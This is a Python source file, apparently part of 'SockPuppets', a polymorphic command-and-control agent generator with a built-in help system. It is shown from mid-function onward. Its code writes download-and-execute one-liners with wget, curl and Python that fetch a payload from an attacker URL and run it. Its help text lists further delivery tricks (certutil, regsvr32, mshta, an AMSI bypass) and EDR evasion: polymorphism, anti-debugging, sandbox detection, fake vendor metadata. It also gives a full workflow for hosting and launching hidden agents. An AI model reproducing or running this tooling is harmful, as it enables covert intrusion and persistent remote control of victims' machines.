        wget_linux = f'wget -q -O /tmp/p {payload_url} && chmod +x /tmp/p && /tmp/p'
        oneliners['wget_linux'] = wget_linux

        curl_linux = f'curl -s -o /tmp/p {payload_url} && chmod +x /tmp/p && /tmp/p'
        oneliners['curl_linux'] = curl_linux

        # Python one-liner
        python_oneliner = f'python -c "import urllib.request;exec(urllib.request.urlopen(\'{payload_url}\').read())"'
        oneliners['python'] = python_oneliner

        # Save to file if requested
        if output_file:
            output_path = self.output_dir / output_file
            with open(output_path, 'w') as f:
                f.write("# One-Liner Payloads\n")
                f.write(f"# Payload URL: {payload_url}\n\n")
                for name, oneliner in oneliners.items():
                    f.write(f"## {name}\n")
                    f.write(f"{oneliner}\n\n")
            print(f"[+] One-liners saved to: {output_path}")

        return oneliners

    def _encode_powershell_command(self, command: str) -> str:
        """Encode PowerShell command to base64"""
        import base64
        # PowerShell expects UTF-16LE encoding
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        return encoded

    def compile_multi_arch(self, python_file: str, architectures: list = None, upx: bool = True) -> dict:
        """Compile for multiple architectures

        Args:
            python_file: Path to Python file
            architectures: List of architectures ['x86', 'x64', 'arm64']
            upx: Use UPX compression

        Returns:
            dict: Architecture -> compiled file path
        """
        if architectures is None:
            architectures = ['x64']  # Default to x64

        results = {}

        for arch in architectures:
            print(f"\n[*] Compiling for {arch}...")
            result = self.compile_to_exe(python_file, arch=arch, upx=upx)
            results[arch] = result

        return results

    def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                     beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                     compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                     shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
                     target_os: str = 'auto', generate_multi_os: bool = False) -> dict:
        """Generate agents for all platforms

        Args:
            c2_host: Server host
            c2_port: Server port
            encryption_key: Encryption key
            beacon_mode: Enable beacon mode
            beacon_interval: Beacon interval in seconds
            beacon_jitter: Jitter percentage (0-100) for beacon sleep times
            compile_exe: Compile Python agent to executable
            compile_dll: Compile Python agent to DLL (Windows only)
            generate_shellcode: Generate shellcode from agent
            shellcode_format: Shellcode format ('raw', 'c', 'python', 'powershell')
            architectures: List of architectures for compilation ['x86', 'x64', 'arm64']
            upx: Use UPX compression
            icon: Path to icon file for executables
            target_os: Target OS ('windows', 'linux', 'macos', 'auto')
            generate_multi_os: Generate agents for all OS types
        """
        results = {}

        # If multi-OS requested, generate for all platforms
        if generate_multi_os:
            os_list = ['windows', 'linux', 'macos']
            print(f"[*] Generating polymorphic agents for multiple operating systems")
        else:
            os_list = [target_os]

        # Generate Python agents for each OS
        for os_type in os_list:
            try:
                os_key = f'python_{os_type}' if generate_multi_os else 'python'
                results[os_key] = self.generate_python_agent(
                    c2_host, c2_port, encryption_key,
                    beacon_mode, beacon_interval, beacon_jitter,
                    target_os=os_type
                )
                if beacon_mode:
                    jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
                    mode_desc = f"beacon ({beacon_interval}s{jitter_desc})"
                else:
                    mode_desc = "streaming"
                print(f"[+] Python agent generated ({mode_desc}, {os_type}): {results[os_key]}")
            except Exception as e:
                results[os_key] = f"Error: {str(e)}"
                print(f"[-] Python agent failed ({os_type}): {str(e)}")

        try:
            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, encryption_key)
            print(f"[+] PowerShell agent generated: {results['powershell']}")
        except Exception as e:
            results['powershell'] = f"Error: {str(e)}"
            print(f"[-] PowerShell agent failed: {str(e)}")

        try:
            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, encryption_key)
            print(f"[+] JavaScript agent generated: {results['javascript']}")
        except Exception as e:
            results['javascript'] = f"Error: {str(e)}"
            print(f"[-] JavaScript agent failed: {str(e)}")

        try:
            results['hta'] = self.generate_hta_agent(c2_host, c2_port, encryption_key)
            print(f"[+] HTA agent generated: {results['hta']}")
        except Exception as e:
            results['hta'] = f"Error: {str(e)}"
            print(f"[-] HTA agent failed: {str(e)}")

        # Compile Python agents to executables
        if compile_exe:
            # Find all Python agents to compile
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                print(f"\n[*] Compiling {agent_key} agent...")

                if architectures and len(architectures) > 1:
                    # Multi-architecture compilation
                    print(f"[*] Target architectures: {', '.join(architectures)}")
                    compiled = self.compile_multi_arch(agent_path, architectures, upx)
                    for arch, path in compiled.items():
                        exe_key = f'exe_{arch}_{os_suffix}' if generate_multi_os else f'exe_{arch}'
                        results[exe_key] = path
                        if not path.startswith('Error'):
                            print(f"[+] {arch.upper()} executable generated: {path}")
                else:
                    # Single architecture compilation
                    arch = architectures[0] if architectures else 'x64'
                    exe_key = f'exe_{arch}_{os_suffix}' if generate_multi_os else f'exe_{arch}'
                    results[exe_key] = self.compile_to_exe(agent_path, arch=arch, upx=upx, icon=icon)
                    if not results[exe_key].startswith('Error'):
                        print(f"[+] {arch.upper()} executable generated: {results[exe_key]}")
                    else:
                        print(f"[-] EXE compilation failed: {results[exe_key]}")

        # Compile Python agents to DLLs (Windows only)
        if compile_dll:
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                # Only compile Windows agents to DLL
                if 'windows' in agent_key or target_os == 'windows':
                    os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                    print(f"\n[*] Compiling {agent_key} agent to DLL...")

                    for arch in (architectures or ['x64']):
                        if arch not in ['x86', 'x64']:
                            continue  # DLLs only support x86/x64

                        dll_key = f'dll_{arch}_{os_suffix}' if generate_multi_os else f'dll_{arch}'
                        results[dll_key] = self.compile_to_dll(agent_path, arch=arch, upx=upx)
                        if not results[dll_key].startswith('Error'):
                            print(f"[+] {arch.upper()} DLL generated: {results[dll_key]}")
                        else:
                            print(f"[-] DLL compilation failed: {results[dll_key]}")

        # Generate shellcode from Python agents
        if generate_shellcode:
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                # Only generate shellcode for Windows agents
                if 'windows' in agent_key or target_os == 'windows':
                    os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                    print(f"\n[*] Generating shellcode from {agent_key} agent...")

                    for arch in (architectures or ['x64']):
                        if arch not in ['x86', 'x64']:
                            continue  # Shellcode only supports x86/x64

                        sc_key = f'shellcode_{shellcode_format}_{arch}_{os_suffix}' if generate_multi_os else f'shellcode_{shellcode_format}_{arch}'
                        results[sc_key] = self.generate_shellcode(agent_path, arch=arch, format=shellcode_format)
                        if not results[sc_key].startswith('Error'):
                            print(f"[+] {arch.upper()} shellcode ({shellcode_format}) generated: {results[sc_key]}")
                        else:
                            print(f"[-] Shellcode generation failed: {results[sc_key]}")

        return results


def show_help_generate():
    """Show help for agent generation"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        AGENT GENERATION HELP
═══════════════════════════════════════════════════════════════════════════

BASIC USAGE:
    python agent.py --host <IP> --port <PORT> [OPTIONS]

REQUIRED PARAMETERS:
    --host <IP>         C2 server IP address or hostname
    --port <PORT>       C2 server port number

AGENT MODES:
    --beacon            Enable beacon mode (callbacks at intervals)
    --interval <SEC>    Beacon callback interval in seconds (default: 60)
    --jitter <PCT>      Beacon timing jitter 0-100% (default: 0)
                        Example: --jitter 30 = ±30% random variance

OPERATING SYSTEMS:
    --os <TYPE>         Target OS: auto, windows, linux, macos (default: auto)
    --multi-os          Generate agents for ALL operating systems

EXAMPLES:
    # Windows beacon agent with 30% jitter
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60 --jitter 30

    # Linux streaming agent
    python agent.py --host 10.0.0.50 --port 8443 --os linux

    # Generate for all OS types
    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 120

For more help: python agent.py help [agents|formats|evasion|oneliners|examples]
"""
    print(help_text)

def show_help_agents():
    """Show help for agent types and features"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                           AGENT TYPES HELP
═══════════════════════════════════════════════════════════════════════════

AGENT MODES:

    STREAMING MODE (Default)
    ├─ Persistent connection to C2
    ├─ Real-time command execution
    ├─ Heartbeat every 10 seconds
    └─ Best for: Interactive sessions

    BEACON MODE (--beacon)
    ├─ Periodic callbacks to C2
    ├─ Configurable sleep intervals
    ├─ Optional jitter for randomization
    ├─ Offline command queueing
    └─ Best for: Stealth, long-term access

OS-SPECIFIC FEATURES:

    WINDOWS AGENTS:
    ├─ Console window hiding (ctypes)
    ├─ Error dialog suppression
    ├─ PowerShell command execution
    ├─ Windows API integration
    └─ DLL injection support

    LINUX AGENTS:
    ├─ Daemonization (fork/setsid)
    ├─ /dev/null I/O redirection
    ├─ Shell detection ($SHELL)
    ├─ UID/GID reporting
    └─ Background process support

    MACOS AGENTS:
    ├─ Background process setup
    ├─ AppleScript execution support
    ├─ Unix daemonization
    ├─ Shell integration
    └─ Native macOS features

POLYMORPHIC FEATURES:
    ✓ Unique variable names per agent
    ✓ Unique function names per agent
    ✓ Unique encryption keys (SHA256-based)
    ✓ Randomized code structure
    ✓ Different binary signatures

EXAMPLES:
    # Windows agent with all features
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 30 --jitter 25

    # Linux daemon agent
    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 300

    # macOS streaming agent
    python agent.py --host 192.168.1.100 --port 443 --os macos
"""
    print(help_text)

def show_help_formats():
    """Show help for output formats"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                         OUTPUT FORMATS HELP
═══════════════════════════════════════════════════════════════════════════

COMPILATION OPTIONS:

    EXECUTABLES (--compile)
    ├─ Platform: Windows, Linux, macOS
    ├─ Architectures: x86, x64, arm64
    ├─ Features: UPX compression, fake version info
    ├─ Output: Standalone .exe or binary
    └─ Usage: python agent.py --host IP --port PORT --compile --arch x64

    DLLs (--dll)
    ├─ Platform: Windows only
    ├─ Architectures: x86, x64
    ├─ Features: DllMain export, thread-based execution
    ├─ Output: .dll file with random export name
    ├─ Usage: rundll32.exe <dll>,<export>
    └─ Example: python agent.py --host IP --port PORT --os windows --dll

    SHELLCODE (--shellcode)
    ├─ Platform: Windows (x86/x64)
    ├─ Formats:
    │   ├─ raw       → Binary .bin file
    │   ├─ c         → C array unsigned char[]
    │   ├─ python    → Python bytearray[]
    │   └─ powershell→ PowerShell byte array
    ├─ Features: Compressed, position-independent stub
    └─ Example: python agent.py --host IP --port PORT --shellcode --format c

ARCHITECTURE OPTIONS:
    --arch x86          32-bit Intel/AMD
    --arch x64          64-bit Intel/AMD (default)
    --arch arm64        64-bit ARM (compilation only)
    --arch x86 x64      Multi-architecture (space separated)

ADDITIONAL OPTIONS:
    --no-upx            Disable UPX compression
    --icon <file.ico>   Custom icon for executables
    --output <dir>      Output directory (default: output/)

EXAMPLES:

    # Compile Windows x64 executable
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Multi-architecture compilation
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64

    # DLL for injection
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64

    # Shellcode in C format
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c

    # Shellcode in PowerShell format
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell

    # All formats at once
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll --shellcode
"""
    print(help_text)

def show_help_evasion():
    """Show help for EDR evasion techniques"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        EDR EVASION TECHNIQUES
═══════════════════════════════════════════════════════════════════════════

POLYMORPHIC OBFUSCATION (Automatic):
    ✓ Variable name randomization      → obj_ABC123, ctx_XYZ789
    ✓ Function name randomization      → handler_DEF456, proc_GHI012
    ✓ Import alias randomization       → import time as mgr_JKL345
    ✓ Unique code structure per agent  → Different instruction ordering
    ✓ Dead code insertion              → Benign junk functions/variables

STRING OBFUSCATION (Automatic):
    ✓ Base64 encoding                  → __import__('base64').b64decode(...)
    ✓ Hexadecimal encoding             → bytes.fromhex('...')
    ✓ Reverse string encoding          → 'string'[::-1]
    ✓ XOR encoding with random key     → chr(ord(c)^KEY)

ANTI-ANALYSIS (Automatic):
    ✓ Anti-debugging checks            → sys.gettrace() detection
    ✓ Sandbox timing detection         → VM detection via timing
    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
    ✓ Comment stripping                → No OPSEC-sensitive comments
    ✓ Docstring removal                → No documentation strings

BINARY OBFUSCATION (--compile):
    ✓ Fake version information         → Mimics Microsoft/Adobe/etc
    ✓ Randomized executable names      → Unique filenames
    ✓ UPX compression (optional)       → Adds entropy, signature variation
    ✓ Debug symbol stripping           → Removes debugging info
    ✓ Unique binary signatures         → Different hash per compilation

ENCRYPTION:
    ✓ Unique XOR keys per agent        → SHA256-based key generation
    ✓ Randomized key length            → Varies per agent
    ✓ No hardcoded keys                → Generated at creation time

ENTROPY MANAGEMENT (EK47 Technique):
    Target: Shannon entropy < 7.0 (normal code range: 4.5-6.5)
    Method: Low-entropy padding with common English words
    Result: Appears as legitimate code to entropy-based scanners

OPSEC FEATURES:
    ✓ No comments in generated code    → Clean, production-ready
    ✓ No debug output                  → Silent execution
    ✓ No hardcoded identifiers         → Fully randomized
    ✓ Minimal static signatures        → Hard to signature

EVASION STATUS:
    [AUTO] Polymorphism                Enabled by default
    [AUTO] String obfuscation          Enabled by default
    [AUTO] Anti-debugging              Enabled by default
    [AUTO] Sandbox detection           Enabled by default
    [AUTO] Entropy reduction           Enabled by default
    [AUTO] Comment stripping           Enabled by default
    [OPT]  UPX compression             --compile (enabled unless --no-upx)
    [OPT]  Fake metadata               --compile (Windows only)

NOTE: All evasion techniques are applied automatically. No additional flags needed.

EXAMPLES:
    # Generate with all evasion (default)
    python agent.py --host 192.168.1.100 --port 443 --os windows

    # Compile with fake version info
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Disable UPX if needed
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx
"""
    print(help_text)

def show_help_oneliners():
    """Show help for one-liner payloads"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        ONE-LINER PAYLOADS HELP
═══════════════════════════════════════════════════════════════════════════

USAGE:
    python agent.py --host <IP> --port <PORT> --oneliners <PAYLOAD_URL>

DESCRIPTION:
    Generates one-liner payloads for various delivery mechanisms.
    Output saved to: output/oneliners.txt

DELIVERY MECHANISMS (15+):

    POWERSHELL:
    ├─ powershell                → Basic download & execute
    └─ powershell_amsi_bypass    → With AMSI bypass

    WINDOWS NATIVE:
    ├─ mshta                     → JavaScript execution
    ├─ mshta_download            → VBScript download wrapper
    ├─ wscript                   → VBScript execution
    ├─ rundll32                  → JavaScript via RunHTMLApplication
    ├─ certutil                  → Download via CertUtil
    ├─ bitsadmin                 → Background Intelligent Transfer
    ├─ regsvr32                  → Squiblydoo technique
    ├─ msiexec                   → MSI installer execution
    └─ curl                      → Windows 10+ curl

    LINUX/UNIX:
    ├─ wget_linux                → Download via wget
    ├─ curl_linux                → Download via curl
    └─ python                    → Python one-liner

    NETWORK:
    └─ smb                       → UNC path execution

EXAMPLE USAGE:

    # Generate one-liners for hosted payload
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --oneliners http://192.168.1.100:8000/agent.exe

    # This creates output/oneliners.txt with all delivery methods

EXAMPLE OUTPUT (oneliners.txt):

    ## powershell
    powershell -w hidden -enc <BASE64_ENCODED_COMMAND>

    ## mshta
    mshta.exe javascript:a=GetObject("script:http://...").Exec();close()

    ## certutil
    certutil -urlcache -split -f http://server/agent.exe %temp%\\p.exe && %temp%\\p.exe

    ## regsvr32 (Squiblydoo)
    regsvr32 /s /n /u /i:http://server/agent.exe scrobj.dll

    ... and 11 more variants

DELIVERY TIPS:
    • PowerShell: Best for quick execution, consider AMSI
    • MSHTA: Good for bypassing AppLocker
    • Rundll32: Living-off-the-land binary
    • CertUtil: Commonly whitelisted
    • Regsvr32: Squiblydoo - COM scriptlet execution
    • SMB: Direct execution from network share

COMPLETE WORKFLOW:
    1. Generate agent:
       python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    2. Host payload:
       python -m http.server 8000  # In output/ directory

    3. Generate one-liners:
       python agent.py --host 192.168.1.100 --port 443 --os windows \\
           --oneliners http://192.168.1.100:8000/agent_ABC123_x64.exe

    4. Use payload:
       powershell -w hidden -enc <BASE64_FROM_ONELINERS_TXT>
"""
    print(help_text)

def show_help_examples():
    """Show comprehensive examples"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                         COMPREHENSIVE EXAMPLES
═══════════════════════════════════════════════════════════════════════════

BASIC AGENT GENERATION:

    # Simple Windows streaming agent
    python agent.py --host 192.168.1.100 --port 443 --os windows

    # Linux beacon agent (2-minute callback)
    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 120

    # macOS beacon with 50% jitter
    python agent.py --host 192.168.1.100 --port 443 --os macos --beacon --interval 60 --jitter 50

MULTI-OS DEPLOYMENT:

    # Generate agents for all platforms
    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 180

    # Compile for all platforms
    python agent.py --host 192.168.1.100 --port 443 --multi-os --compile

COMPILATION SCENARIOS:

    # Windows x64 executable
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Windows x86 + x64 executables
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64

    # Windows executable with custom icon
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --icon app.ico

    # Disable UPX compression
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx

DLL INJECTION:

    # Generate x64 DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64

    # Generate x86 DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86

    # Both architectures
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86 x64

    # Execute DLL:
    rundll32.exe <dll_name>,<export_function>

SHELLCODE GENERATION:

    # Raw binary shellcode
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode

    # C array format (for C/C++ projects)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c

    # Python format (for Python injectors)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format python

    # PowerShell format (for PS injectors)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell

ONE-LINER GENERATION:

    # Generate delivery payloads
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --oneliners http://192.168.1.100:8000/agent.exe

COMPLETE WORKFLOWS:

    # Red Team Assessment - Full suite
    python agent.py --host 10.0.0.50 --port 443 --os windows \\
        --beacon --interval 300 --jitter 30 \\
        --compile --dll --shellcode --format c \\
        --arch x86 x64 \\
        --oneliners http://10.0.0.50:8000/agent.exe

    # Stealth Operation - Long beacon
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --beacon --interval 3600 --jitter 50 \\
        --compile --no-upx

    # Quick Access - Streaming mode
    python agent.py --host 192.168.1.100 --port 8443 --os linux

    # Multi-platform deployment
    python agent.py --host 192.168.1.100 --port 443 \\
        --multi-os --beacon --interval 600 --jitter 25 \\
        --compile --arch x64

OUTPUT STRUCTURE:

    output/
    ├── agent_<hash>_beacon<interval>s_<os>.py    # Python source
    ├── <random>_x64.exe                           # Executable
    ├── <random>_x64.dll                           # DLL
    ├── shellcode_<random>_x64.bin                 # Raw shellcode
    ├── shellcode_<random>_x64.c                   # C array
    ├── shellcode_<random>_x64.py                  # Python array
    ├── shellcode_<random>_x64.ps1                 # PowerShell array
    ├── oneliners.txt                              # One-liner payloads
    └── agent_*.ps1/js/hta                         # Other formats

TIPS:
    • Always use unique agents per target (automatic)
    • Use beacon mode with jitter for stealth
    • Multi-architecture compilation for compatibility
    • One-liners provide multiple delivery options
    • Combine --compile --dll --shellcode for full arsenal
"""
    print(help_text)

def show_main_help():
    """Show main help menu"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
              SockPuppets - Polymorphic Agent Generator v2.0
                        EDR Evasion & Multi-Platform C2
═══════════════════════════════════════════════════════════════════════════

USAGE:
    python agent.py --host <IP> --port <PORT> [OPTIONS]
    python agent.py help [topic]

HELP TOPICS:
    help generate     → Agent generation options and modes
    help agents       → Agent types, features, and OS-specific details
    help formats      → Output formats (EXE, DLL, shellcode)
    help evasion      → EDR evasion techniques and features
    help oneliners    → One-liner payload generation
    help examples     → Comprehensive usage examples

QUICK START:
    # Generate Windows beacon agent
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60

    # Generate for all OS types
    python agent.py --host 192.168.1.100 --port 443 --multi-os

    # Compile to executable with DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll

KEY FEATURES:
    ✓ Polymorphic code generation      → Unique signature per agent
    ✓ Advanced EDR evasion             → Anti-debug, sandbox detection
    ✓ Multi-OS support                 → Windows, Linux, macOS
    ✓ Multiple output formats          → EXE, DLL, shellcode
    ✓ 15+ delivery mechanisms          → One-liner generation
    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
    ✓ OPSEC-safe                       → No comments, clean code
    ✓ Unique encryption per agent      → Auto-generated keys

COMMON OPTIONS:
    --host <IP>          C2 server address (required)
    --port <PORT>        C2 server port (required)
    --os <TYPE>          Target OS: windows, linux, macos, auto
    --beacon             Enable beacon mode
    --interval <SEC>     Beacon callback interval (default: 60)
    --jitter <PCT>       Beacon timing jitter 0-100% (default: 0)
    --compile            Compile to executable
    --dll                Compile to DLL (Windows)
    --shellcode          Generate shellcode
    --oneliners <URL>    Generate one-liner payloads

For detailed help on any topic:
    python agent.py help <topic>

For authorized security testing only.
"""
    print(help_text)

if __name__ == '__main__':
    import argparse
    import sys

    # Check if help command was requested
    if len(sys.argv) > 1 and sys.argv[1] == 'help':
        if len(sys.argv) > 2:
            topic = sys.argv[2].lower()
            if topic == 'generate':
                show_help_generate()
            elif topic == 'agents':
                show_help_agents()
            elif topic == 'formats':
                show_help_formats()
            elif topic == 'evasion':
                show_help_evasion()
            elif topic == 'oneliners':
                show_help_oneliners()
            elif topic == 'examples':
                show_help_examples()
            else:
                print(f"Unknown help topic: {topic}")
                print("Available topics: generate, agents, formats, evasion, oneliners, examples")
        else:
            show_main_help()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description='SockPuppets - Polymorphic Agent Generator with EDR Evasion',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='For detailed help: python agent.py help [generate|agents|formats|evasion|oneliners|examples]'
    )
    parser.add_argument('--host', required=True, help='Server host/IP')
    parser.add_argument('--port', type=int, required=True, help='Server port')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key (auto-generated by default)')
    parser.add_argument('--beacon', action='store_true', help='Enable beacon mode')
    parser.add_argument('--interval', type=int, default=60, help='Beacon interval in seconds (default: 60)')
    parser.add_argument('--jitter', type=int, default=0, help='Beacon jitter percentage 0-100 (default: 0)')
    parser.add_argument('--compile', action='store_true', help='Compile Python agent to executable')
    parser.add_argument('--dll', action='store_true', help='Compile Python agent to DLL (Windows only)')
    parser.add_argument('--shellcode', action='store_true', help='Generate shellcode from agent')
    parser.add_argument('--format', choices=['raw', 'c', 'python', 'powershell'], default='raw',
                       help='Shellcode output format (default: raw)')
    parser.add_argument('--arch', nargs='+', choices=['x86', 'x64', 'arm64'], default=['x64'],
                       help='Target architecture(s) for compilation (default: x64)')
    parser.add_argument('--no-upx', action='store_true', help='Disable UPX compression')
    parser.add_argument('--icon', type=str, help='Path to icon file (.ico) for executable')
    parser.add_argument('--output', default='output', help='Output directory (default: output)')
    parser.add_argument('--os', dest='target_os', choices=['auto', 'windows', 'linux', 'macos'], default='auto',
                       help='Target operating system (default: auto = current platform)')
    parser.add_argument('--multi-os', dest='multi_os', action='store_true',
                       help='Generate agents for all operating systems (Windows, Linux, macOS)')
    parser.add_argument('--oneliners', type=str, metavar='URL',
                       help='Generate one-liner payloads for delivery (provide payload URL)')

    args = parser.parse_args()

    print("[*] Polymorphic Agent Generator with EDR Evasion")
    print("[*] Each generated agent has unique code signatures")
    print()

    generator = AgentGenerator(args.output)
    results = generator.generate_all(
        args.host, args.port, args.key, args.beacon, args.interval, args.jitter,
        args.compile, args.dll, args.shellcode, args.format,
        args.arch, not args.no_upx, args.icon, args.target_os, args.multi_os
    )

    print("\n" + "="*60)
    print("[+] Agent generation complete!")
    print("="*60)
    print(f"[+] Output directory: {args.output}")
    if args.beacon:
        jitter_info = f" with {args.jitter}% jitter" if args.jitter > 0 else ""
        print(f"[+] Beacon mode enabled with {args.interval}s interval{jitter_info}")
    if args.multi_os:
        print(f"[+] Generated agents for: Windows, Linux, macOS")
    elif args.target_os != 'auto':
        print(f"[+] Generated agents for: {args.target_os}")
    if args.compile:
        print(f"[+] Compiled for architectures: {', '.join(args.arch)}")
    print("\n[*] Features enabled:")
    print("    - Polymorphic code generation (unique per agent)")
    print("    - Anti-debugging checks")
    print("    - Sandbox detection")
    print("    - String obfuscation")
    print("    - Unique encryption keys")
    print("    - OS-specific optimizations")

    # Generate one-liners if requested
    if hasattr(args, 'oneliners') and args.oneliners:
        print("\n[*] Generating one-liner payloads...")
        oneliners = generator.generate_oneliners(args.oneliners, 'oneliners.txt')
        print(f"[+] Generated {len(oneliners)} one-liner variants")
        print("\n[*] One-liner delivery mechanisms:")
        for name in oneliners.keys():
            print(f"    - {name}")
